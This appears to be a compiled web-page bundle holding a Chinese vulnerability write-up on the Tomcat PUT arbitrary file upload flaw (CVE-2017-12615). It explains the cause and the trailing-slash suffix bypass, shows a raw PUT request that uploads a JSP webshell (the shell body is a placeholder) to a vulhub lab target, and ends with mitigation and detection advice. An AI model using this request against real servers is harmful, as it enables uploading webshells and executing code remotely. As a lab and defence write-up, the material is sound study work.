import{_ as n}from"./plugin-vue_export-helper-x3n3nnut.js";import{r as i,o as l,c as r,a as e,b as a,d as s,e as d}from"./app-pej36io0.js";const c="/DailyNotes/assets/02-YhJnv9A8.png",v="/DailyNotes/assets/01-GOzLtV1p.png",o={},m=e("h1",{id:"漏洞名称-tomcat-put方法任意写文件漏洞",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞名称-tomcat-put方法任意写文件漏洞","aria-hidden":"true"},"#"),a(" 漏洞名称：Tomcat PUT方法任意写文件漏洞")],-1),p=e("hr",null,null,-1),u=e("h2",{id:"漏洞介绍",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞介绍","aria-hidden":"true"},"#"),a(" 漏洞介绍")],-1),h={href:"http://www.cnnvd.org.cn/index.html",target:"_blank",rel:"noopener noreferrer"},g=d(`<hr><p>Apache Tomcat是美国阿帕奇（Apache）软件基金会下属的Jakarta项目的一款轻量级Web应用服务器，它主要用于开发和调试JSP程序，适用于中小型系统。部分版本的Tomcat启用HTTP PUT请求方法时，远程攻击者可以构造恶意请求利用该漏洞向服务器上传包含任意代码执行的jsp文件，并被服务器执行该文件，导致攻击者可以执行任意代码。</p><hr><h3 id="漏洞危害" tabindex="-1"><a class="header-anchor" href="#漏洞危害" aria-hidden="true">#</a> 漏洞危害</h3><p>攻击者有可能可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件，之后JSP 文件中的代码将能被服务器执行。</p><hr><h3 id="影响范围" tabindex="-1"><a class="header-anchor" href="#影响范围" aria-hidden="true">#</a> 影响范围</h3><p>7.0.0&lt;=Version &lt;=7.0.79</p><hr><h2 id="漏洞原理" tabindex="-1"><a class="header-anchor" href="#漏洞原理" aria-hidden="true">#</a> 漏洞原理</h2><p>Tomcat 的 Servlet 是在 conf/web.xml 配置的，通过配置文件可知，漏洞本质Tomcat配置了可写（readonly=false），导致我们可以往服务器写文件：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>    &lt;servlet&gt;
        &lt;servlet-name&gt;default&lt;/servlet-name&gt;
        &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;
        &lt;init-param&gt;
            &lt;param-name&gt;debug&lt;/param-name&gt;
            &lt;param-value&gt;0&lt;/param-value&gt;
        &lt;/init-param&gt;
        &lt;init-param&gt;
            &lt;param-name&gt;listings&lt;/param-name&gt;
            &lt;param-value&gt;false&lt;/param-value&gt;
        &lt;/init-param&gt;
&lt;init-param&gt;&lt;param-name&gt;readonly&lt;/param-name&gt;&lt;param-value&gt;false&lt;/param-value&gt;&lt;/init-param&gt;
        &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;
    &lt;/servlet&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>当后缀名为 .jsp 和 .jspx 的时候，是通过JspServlet处理请求的。例如<code>1.jsp </code>（末尾有一个空格）并不能匹配到 JSP Servlet，而是会交由default Servlet去处理。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;!-- The mapping for the default servlet --&gt;
    &lt;servlet-mapping&gt;
        &lt;servlet-name&gt;default&lt;/servlet-name&gt;
        &lt;url-pattern&gt;/&lt;/url-pattern&gt;
    &lt;/servlet-mapping&gt;

    &lt;!-- The mappings for the JSP servlet --&gt;
    &lt;servlet-mapping&gt;
        &lt;servlet-name&gt;jsp&lt;/servlet-name&gt;
        &lt;url-pattern&gt;*.jsp&lt;/url-pattern&gt;
        &lt;url-pattern&gt;*.jspx&lt;/url-pattern&gt;
    &lt;/servlet-mapping&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>虽然Tomcat对文件后缀有一定检测（不能直接写jsp），但我们使用一些文件系统的特性（如Linux下可用<code>/</code>）来绕过了限制。</p><hr><h3 id="靶机环境" tabindex="-1"><a class="header-anchor" href="#靶机环境" aria-hidden="true">#</a> 靶机环境</h3><p>vulhub/tomcat/CVE-2017-12615</p><hr><h3 id="利用方式-1" tabindex="-1"><a class="header-anchor" href="#利用方式-1" aria-hidden="true">#</a> 利用方式 1</h3><p>使用PUT请求发送以下内容：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>PUT /1.jsp/ HTTP/1.1
Host: 192.168.1.189:8090
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 958

--jsp shell--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="`+c+'" alt="02" tabindex="0" loading="lazy"><figcaption>02</figcaption></figure><p>然后利用蚁剑进行连接：</p><figure><img src="'+v+'" alt="01" tabindex="0" loading="lazy"><figcaption>01</figcaption></figure><h3 id="" tabindex="-1"><a class="header-anchor" href="#" aria-hidden="true">#</a></h3><hr><h2 id="威胁防护建议" tabindex="-1"><a class="header-anchor" href="#威胁防护建议" aria-hidden="true">#</a> 威胁防护建议</h2><hr><h3 id="用户处置建议" tabindex="-1"><a class="header-anchor" href="#用户处置建议" aria-hidden="true">#</a> 用户处置建议</h3><p>将 conf/web.xml 中对于 DefaultServlet 的 readonly 设置为 true</p><hr><h3 id="安全产品检测建议" tabindex="-1"><a class="header-anchor" href="#安全产品检测建议" aria-hidden="true">#</a> 安全产品检测建议</h3><p>检测PUT形式发送后缀名为jsp的请求</p><p>检测jsp格式的木马</p>',35);function b(f,x){const t=i("ExternalLinkIcon");return l(),r("div",null,[m,p,u,e("blockquote",null,[e("p",null,[e("a",h,[a("国家信息安全漏洞库 (cnnvd.org.cn)"),s(t)])])]),g])}const S=n(o,[["render",b],["__file","tomcat_CVE-2017-12615.html.vue"]]);export{S as default};
